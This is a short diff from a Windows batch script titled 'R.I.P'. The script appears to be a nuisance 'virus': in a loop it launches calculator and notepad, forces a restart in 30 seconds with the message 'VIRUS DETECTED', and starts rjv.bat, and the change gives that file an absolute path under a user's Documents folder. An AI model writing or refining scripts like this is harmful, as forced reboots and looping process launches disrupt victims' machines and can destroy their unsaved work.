@@ -5,5 +5,5 @@ title R.I.P
 start calc
 shutdown -r -t 30 -c "VIRUS DETECTED"
 start notepad
-start rjv.bat
+start C:\Users\User\Documents\rjv.bat
 goto a
